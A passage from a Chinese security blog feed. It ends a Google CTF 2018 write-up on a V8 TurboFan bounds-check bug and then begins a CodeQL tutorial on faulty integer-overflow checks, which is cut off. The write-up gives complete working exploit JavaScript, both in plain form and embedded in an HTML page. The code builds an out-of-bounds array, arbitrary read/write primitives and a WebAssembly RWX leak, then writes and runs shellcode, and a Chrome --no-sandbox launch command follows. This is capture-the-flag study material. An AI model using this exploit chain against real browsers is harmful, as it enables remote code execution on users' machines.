class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,</span><br><span class="line">    <span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,</span><br><span class="line">    <span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">102</span>,<span class="number">117</span>,<span class="number">110</span>,<span class="number">99</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">136</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">1</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode),&#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> WasmJSFunction = m.exports.func;</span><br><span class="line"><span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span><br><span class="line"><span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionObj = &#123;<span class="attr">guard</span>: Int64ToFloat64(<span class="number">0x233333</span>), <span class="attr">wasmAddr</span>: WasmJSFunction&#125;;</span><br><span class="line"><span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++)</span><br><span class="line">&#123;   </span><br><span class="line">    <span class="comment">// 查找哨兵值</span></span><br><span class="line">    <span class="keyword">if</span>(Float64ToInt64(oob_arr[i]) == <span class="number">0x233333</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        WasmJSFunctionIndex = i + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span><br><span class="line"><span class="keyword">if</span>(WasmJSFunctionIndex == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取 WasmJSFunction 地址</span></span><br><span class="line">WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span><br><span class="line"><span class="comment">// 获取 SharedFunctionInfo 地址</span></span><br><span class="line">SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(<span class="number">0x18</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span><br><span class="line"><span class="comment">// 获取 WasmExportedFunctionData 地址</span></span><br><span class="line">WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(<span class="number">0x8</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span><br><span class="line"><span class="comment">// 获取 WasmInstanceObject 地址</span></span><br><span class="line">WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(<span class="number">0x10</span>)) - BigInt(<span class="number">1</span>);</span><br><span class="line">log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span><br><span class="line"><span class="comment">// 获取 JumpTableStart 地址</span></span><br><span class="line">JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(<span class="number">0xe8</span>));</span><br><span class="line">log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span><br><span class="line"></span><br><span class="line"><span class="comment">/******* -- 写入并执行shell code -- *******/</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span><br><span class="line">    [<span class="number">0x6a</span>, <span class="number">0x3b</span>, <span class="number">0x58</span>, <span class="number">0x99</span>, <span class="number">0x48</span>, <span class="number">0xbb</span>, <span class="number">0x2f</span>, <span class="number">0x62</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x2f</span>, <span class="number">0x73</span>, <span class="number">0x68</span>, <span class="number">0x00</span>, <span class="number">0x53</span>,</span><br><span class="line">     <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe7</span>, <span class="number">0x68</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x52</span>, <span class="number">0xe8</span>, <span class="number">0x1c</span>, <span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x49</span>, <span class="number">0x53</span>, <span class="number">0x50</span>, <span class="number">0x4c</span>, <span class="number">0x41</span>, <span class="number">0x59</span>, <span class="number">0x3d</span>, <span class="number">0x3a</span>, <span class="number">0x30</span>, <span class="number">0x20</span>, <span class="number">0x67</span>, <span class="number">0x6e</span>,</span><br><span class="line">     <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x65</span>, <span class="number">0x2d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x6c</span>, <span class="number">0x63</span>, <span class="number">0x75</span>, <span class="number">0x6c</span>, <span class="number">0x61</span>, <span class="number">0x74</span>, <span class="number">0x6f</span>, <span class="number">0x72</span>, <span class="number">0x00</span>,</span><br><span class="line">     <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0x0f</span>, <span class="number">0x05</span>]</span><br><span class="line">);</span><br><span class="line"><span class="comment">// 写入shellcode </span></span><br><span class="line">log(<span class="string">"[+] writing shellcode ... "</span>);</span><br><span class="line"><span class="comment">// (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span><br><span class="line">    write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);</span><br><span class="line"><span class="comment">// 执行shellcode</span></span><br><span class="line">log(<span class="string">"[+] execute calculator !"</span>);</span><br><span class="line">WasmJSFunction();</span><br></pre></td></tr></table></figure>
<p>最终在 release 版下的 v8 可以成功调用 calculator：</p>
<p><img src="/2021/01/v8-turboFan/debugprint14.png" alt="img"></p>
</li>
<li>
<p>但我们做题实际用到附件是一个带漏洞 v8 的 chromium。为了将 exploit 从 v8 移植到 chromium，其中<strong>做了一点点微调</strong>，因此最终的 exploit 如下：</p>
<blockquote>
<p>这里主要调整了两个地方：</p>
<ol>
<li><strong>微调了内存布局。</strong><br>
将oob_arr、array_buffer以及WasmJSFunctionObj放的更近，使得内存布局的相对偏移不会太大。这样搜索哨兵值时就不用搜索太多次。</li>
<li><strong>将两个搜索哨兵值的for循环合并成一个。</strong><br>
因为动态调试发现，当第二个for循环开始执行几十个循环后，原先存放 oob_array 以及 WasmJSFunctionObj 内存的数据将会被覆盖，<strong>疑似</strong>GC因为对象被过多访问而将其移动至另一个内存段上。这对我们泄露地址相当不利，因此合并两个for循环以降低搜索次数。</li>
</ol>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 64位整数 与 64位浮点数相互转换的原语 -- *******/</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> transformBuffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> bigIntArray = <span class="keyword">new</span> BigInt64Array(transformBuffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> floatArray = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(transformBuffer);</span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Int64ToFloat64</span><span class="params">(int)</span> </span>&#123;</span></span><br><span class="line">        bigIntArray[0] = BigInt(int);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> floatArray[<span class="number">0</span>];</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">Float64ToInt64</span><span class="params">(float)</span> </span>&#123;</span></span><br><span class="line">        floatArray[0] = float;</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> bigIntArray[<span class="number">0</span>];</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 修改JSArray length 的操作 -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> oob_arr = [];</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">opt_me</span><span class="params">(x)</span> </span>&#123;</span></span><br><span class="line">        oob_arr = [1.0, 1.1, 1.2, 1.3, 1.4, 1.5, 1.6];</span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> t = (x == <span class="number">1</span> ? <span class="number">9007199254740992</span> : <span class="number">9007199254740989</span>);</span></span><br><span class="line">        t = t + 1 + 1;</span><br><span class="line">        t -= 9007199254740990;</span><br><span class="line">        t *= 2;</span><br><span class="line">        t += 2;</span><br><span class="line"><span class="actionscript">        oob_arr[t] = <span class="number">3.4766779039175022e-310</span>; <span class="comment">// 0x4000.f2smi</span></span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 试着触发 turboFan，从而修改 JSArray 的 length</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10000</span>; i++)</span></span><br><span class="line">        opt_me(1);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单 checker</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">if</span> (oob_arr[<span class="number">1023</span>] == <span class="literal">undefined</span>)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"OOB Fail!"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">console</span>.log(<span class="string">"[+] oob_arr.length == "</span> + oob_arr.length);</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 布置内存（使 oob_array、array_buffer 以及 WasmJSFunctionObj 相邻） -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 注意必须在执行完turboFan后开始布置</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> array_buffer;</span></span><br><span class="line"><span class="javascript">    array_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x233</span>);</span></span><br><span class="line"><span class="javascript">    data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(array_buffer);</span></span><br><span class="line">    backing_store_offset = -1;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// C++ 代码 `void func() &#123;&#125;` 的 wasm 二进制代码</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span></span><br><span class="line">        0, 1, 96, 0, 0, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5,</span><br><span class="line">        131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2,</span><br><span class="line">        6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 102, 117, 110, 99, 0, 0, 10, 136, 128, 128, 128,</span><br><span class="line">        0, 1, 130, 128, 128, 128, 0, 0, 11]);</span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> m = <span class="keyword">new</span> WebAssembly.Instance(<span class="keyword">new</span> WebAssembly.Module(wasmCode), &#123;&#125;);</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunction = m.exports.func;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 将WasmJSFunction 布置到与 oob_arr 数组相同的内存段上</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 这里写入了一个哨兵值0x233333，用于查找 WasmJSFunction 地址</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunctionObj = &#123; guard: Int64ToFloat64(<span class="number">0x233333</span>), wasmAddr: WasmJSFunction &#125;;</span></span><br><span class="line"><span class="actionscript">    <span class="keyword">var</span> WasmJSFunctionIndex = <span class="number">-1</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 任意地址读写原语 -- *******/</span></span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 确定backing_store_offset 以及 WasmJSFunctionIndex</span></span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 只用一个for循环，只遍历一次</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x4000</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> val = Float64ToInt64(oob_arr[i]);</span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 开始查找哨兵值</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 在查找array_buffer的backing_store时，注意DataView在Array_buffer高地址处</span></span></span><br><span class="line"><span class="actionscript">        <span class="comment">// 查找哨兵值时有可能会查找到错误的位置，因此这里只取查找到的第一个地方</span></span></span><br><span class="line">        if (backing_store_offset == -1 &amp;&amp; val == 0x0000023300000000) &#123;</span><br><span class="line">            backing_store_offset = i + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"[+] find backing_store offset: "</span> + backing_store_offset);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">else</span> <span class="keyword">if</span> (WasmJSFunctionIndex == <span class="number">-1</span> &amp;&amp; val == <span class="number">0x233333</span>) &#123;</span></span><br><span class="line">            WasmJSFunctionIndex = i + 1;</span><br><span class="line"><span class="javascript">            <span class="built_in">console</span>.log(<span class="string">"[+] find WasmJSFunctionAddr offset: "</span> + WasmJSFunctionIndex);</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 如果都找到了就不用再找，以免碰上SIGMAP</span></span></span><br><span class="line">        if (backing_store_offset != -1 &amp;&amp; WasmJSFunctionIndex != -1)</span><br><span class="line"><span class="actionscript">            <span class="keyword">break</span>;</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单确认一下是否成功找到 backing_store</span></span></span><br><span class="line">    if (backing_store_offset == -1)</span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"backing_store is not found!"</span>;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 简单确认一下是否成功找到 WasmJSFunctionAddr</span></span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span> <span class="keyword">if</span> (WasmJSFunctionIndex == <span class="number">-1</span>)</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">throw</span> <span class="string">"WasmJSFunctionAddr is not found!"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">read_8bytes</span><span class="params">(addr)</span> </span>&#123;</span></span><br><span class="line">        oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> data_view.getBigInt64(<span class="number">0</span>, <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">write_8bytes</span><span class="params">(addr, data)</span> </span>&#123;</span></span><br><span class="line">        oob_arr[backing_store_offset] = Int64ToFloat64(addr);</span><br><span class="line"><span class="actionscript">        data_view.setBigInt64(<span class="number">0</span>, BigInt(data), <span class="literal">true</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 布置 wasm 地址以及获取 RWX 内存地址 -- *******/</span></span></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">prettyHex</span><span class="params">(bigint)</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        <span class="keyword">return</span> <span class="string">"0x"</span> + BigInt.asUintN(<span class="number">64</span>, bigint).toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">'0'</span>);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmJSFunction 地址</span></span></span><br><span class="line">    WasmJSFunctionAddr = Float64ToInt64(oob_arr[WasmJSFunctionIndex]) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmJSFunction address: "</span> + prettyHex(WasmJSFunctionAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 SharedFunctionInfo 地址</span></span></span><br><span class="line">    SharedFunctionInfoAddr = read_8bytes(WasmJSFunctionAddr + BigInt(0x18)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find SharedFunctionInfoAddr address: "</span> + prettyHex(SharedFunctionInfoAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmExportedFunctionData 地址</span></span></span><br><span class="line">    WasmExportedFunctionDataAddr = read_8bytes(SharedFunctionInfoAddr + BigInt(0x8)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmExportedFunctionDataAddr address: "</span> + prettyHex(WasmExportedFunctionDataAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 WasmInstanceObject 地址</span></span></span><br><span class="line">    WasmInstanceObjectAddr = read_8bytes(WasmExportedFunctionDataAddr + BigInt(0x10)) - BigInt(1);</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find WasmInstanceObjectAddr address: "</span> + prettyHex(WasmInstanceObjectAddr));</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 获取 JumpTableStart 地址</span></span></span><br><span class="line">    JumpTableStartAddr = read_8bytes(WasmInstanceObjectAddr + BigInt(0xe8));</span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] find JumpTableStartAddr address: "</span> + prettyHex(JumpTableStartAddr));</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="comment">/******* -- 写入并执行shell code -- *******/</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(</span></span><br><span class="line">        [0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53,</span><br><span class="line">            0x48, 0x89, 0xe7, 0x68, 0x2d, 0x63, 0x00, 0x00, 0x48, 0x89, 0xe6, 0x52, 0xe8, 0x1c, 0x00,</span><br><span class="line">            0x00, 0x00, 0x44, 0x49, 0x53, 0x50, 0x4c, 0x41, 0x59, 0x3d, 0x3a, 0x30, 0x20, 0x67, 0x6e,</span><br><span class="line">            0x6f, 0x6d, 0x65, 0x2d, 0x63, 0x61, 0x6c, 0x63, 0x75, 0x6c, 0x61, 0x74, 0x6f, 0x72, 0x00,</span><br><span class="line">            0x56, 0x57, 0x48, 0x89, 0xe6, 0x0f, 0x05]</span><br><span class="line">    );</span><br><span class="line"><span class="actionscript">    <span class="comment">// 写入shellcode </span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] writing shellcode ... "</span>);</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// (尽管单次写入内存的数据大小为8bytes，但为了简便，一次只写入 1bytes 有效数据)</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.length; i++)</span></span><br><span class="line">        write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);</span><br><span class="line"><span class="actionscript">    <span class="comment">// 执行shellcode</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"[+] try to execute shellcode ... "</span>);</span></span><br><span class="line">    WasmJSFunction();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用如下命令以执行exp:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">chrome/chrome --no-sandbox --user-data-dir=./userdata http:<span class="comment">//127.0.0.1:8000/test.html</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>尽管给出的附件打了no-sandbox的patch，但实际exp仍然无法执行，必须附加参数<code>--no-sandbox</code>才能成功触发，玄学问题XD。</p>
</blockquote>
<p>效果如下：</p>
<p>![img](v8-turboFan/exp.gif %}</p>
</li>
</ul>
<h2 id="七、参考">七、参考</h2>
<ol>
<li><a href="https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/" target="_blank" rel="noopener">Introduction to TurboFan</a></li>
<li><a href="https://de4dcr0w.github.io/google-ctf-2018-browser-pwn%E5%88%86%E6%9E%90.html" target="_blank" rel="noopener">google-ctf-2018-browser-pwn分析</a></li>
<li><a href="https://mem2019.github.io/jekyll/update/2019/08/09/Google-CTF-2018-Final-JIT.html" target="_blank" rel="noopener">Why I failed to trigger Bound Check Elimination in Google CTF 2018 Final JIT</a></li>
<li><a href="https://xz.aliyun.com/t/3348?spm=5176.12901015.0.i12901015.1bc1525cy9bvzk" target="_blank" rel="noopener">Google CTF justintime writeup - 先知社区</a></li>
</ol>
]]></content>
      <categories>
        <category>chrome</category>
      </categories>
      <tags>
        <tag>v8</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>深入学习CodeQL by security_lab</title>
    <url>/2020/12/secLab-CodeQL-learning/</url>
    <content><![CDATA[<h2 id="一、简介">一、简介</h2>
<p><a href="https://github.com/github/securitylab/tree/main/CodeQL_Queries/cpp" target="_blank" rel="noopener">github SecurityLab</a> 上有多个CodeQL的使用例子</p>
<p>通过学习这些例子，我们可以加深对CodeQL的了解，以便于更好的使用它。</p>
<a id="more"></a>
<h2 id="二、ChakraCore-bad-overflow-check">二、ChakraCore-bad-overflow-check</h2>
<h3 id="1-漏洞模式">1. 漏洞模式</h3>
<ul>
<li>
<p>这个例子主要是学习如何查找出<strong>错误的</strong>整数相加溢出判断逻辑。</p>
</li>
<li>
<p>以一个例子为例</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkOverflow</span><span class="params">(<span class="keyword">unsigned</span> short x, <span class="keyword">unsigned</span> short y)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// BAD: comparison is always false due to type promotion</span></span><br><span class="line">  <span class="keyword">return</span> (x + y &lt; x);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里相加后的结果由于会自动隐式转换至<code>int</code>类型，因此该加法操作的结果将始终<strong>不会溢出</strong>。这会使得程序<strong>无法正常判断是否存在溢出操作</strong>，而这就是漏洞所在。</p>
</li>
<li>
<p>但在以下这个例子中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">checkOverflow</span><span class="params">(<span class="keyword">unsigned</span> short x, <span class="keyword">unsigned</span> short y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="keyword">unsigned</span> short)(x + y) &lt; x);  <span class="comment">// GOOD: explicit cast</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于相加后的结果会进行强制类型转换，因此该加法操作的结果<strong>可以产生溢出</strong>，溢出判断逻辑工作正常。</p>
</li>
</ul>
<h3 id="2-QL的编写">2. QL的编写</h3>
<ul>
<li>
<p>首先明确目的，我们要查找出<strong>错误的检测溢出的代码</strong>，即上述中的第一个例子。</p>
</li>
<li>
<p>因此，我们先列一下这个模式的必要条件，即通过什么条件来查找出这个漏洞</p>
<ul>
<li>
<p>需要获取符合<code>var1 + var2 &lt;compare&gt; var1</code>的语句</p>
</li>
<li>
<p>比较操作符<code>RelationalOperation</code>左右两边各有一个<code>AddExpr</code>和<code>LocalScopeVariable</code> var1</p>
</li>
<li>
<p>加法操作<code>AddExpr</code>内部所含有的一个<code>LocalScopeVariable</code> va1，与上面的var1是同一个。</p>
</li>
<li>
<p>操作数 var1 的位数必须小于32位</p>
</li>
<li>
<p>加法运算的结果不执行强制类型转换，或者强转后的大小大于32位</p>
<blockquote>
<p>这个条件会使得溢出检测算法无效，而这就是我们的目标所在。</p>
</blockquote>
</li>
</ul>
</li>
<li>
<p>故最终的QL代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Matches `var &lt; var + ???`. */</span></span><br><span class="line"><span class="function">predicate <span class="title">overflowCheck</span><span class="params">(LocalScopeVariable var, AddExpr add, RelationalOperation compare)</span></span>&#123;</span><br><span class="line">  <span class="comment">/* 当前的relationalOperation，其左右两边分别是一个变量以及一个加法语句 */</span></span><br><span class="line">  compare.getAnOperand() = var.getAnAccess() <span class="keyword">and</span></span><br><span class="line">  compare.getAnOperand() = add <span class="keyword">and</span></span><br><span class="line">  <span class="comment">/* 同时这个变量还是加法语句中的一个操作数 */</span></span><br><span class="line">  add.getAnOperand() = var.getAnAccess()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from LocalScopeVariable var, AddExpr add</span><br><span class="line">where overflowCheck(var, add, _)    <span class="comment">/* 获取可能存在溢出的点 */</span></span><br><span class="line">  <span class="keyword">and</span> var.getType().getSize() &lt; <span class="number">4</span>   <span class="comment">/* 当前的操作数大小要小于4字节 */</span></span><br><span class="line">  <span class="keyword">and</span> <span class="keyword">not</span> add.getConversion+().getType().getSize() &lt; <span class="number">4</span> <span class="comment">/* 限制加法的位数 &gt;= 32 */</span></span><br><span class="line">select add, <span class="string">"Overflow check on variable of type "</span> + var.getUnderlyingType()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意where语句中使用的一个通配符<code>_</code>，该通配符用于表示<strong>任何数据集</strong>。</p>
</blockquote>
</li>
</ul>
<h2 id="三、Facebook-Fizz-CVE-2019-3560">三、Facebook_Fizz_CVE-2019-3560</h2>
<h3 id="1-漏洞模式-2">1. 漏洞模式</h3>
<ul>
<li>
<p>该漏洞是一个由<code>+=</code>符所引起的整型溢出漏洞 - <a href="https://github.com/facebookincubator/fizz/blob/eaa81af854bef509c3c1d7c83df0cd0b084a0fef/fizz/record/PlaintextRecordLayer.cpp#L42" target="_blank" rel="noopener">src</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">folly::Optional&lt;TLSMessage&gt; <span class="title">PlaintextReadRecordLayer::read</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    folly::IOBufQueue&amp; buf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取当前buf所读取到的指针位置</span></span><br><span class="line">        folly::<span class="function">io::Cursor <span class="title">cursor</span><span class="params">(buf.front())</span></span>;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="comment">/* ... */</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="comment">/* ... */</span>) &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="comment">// 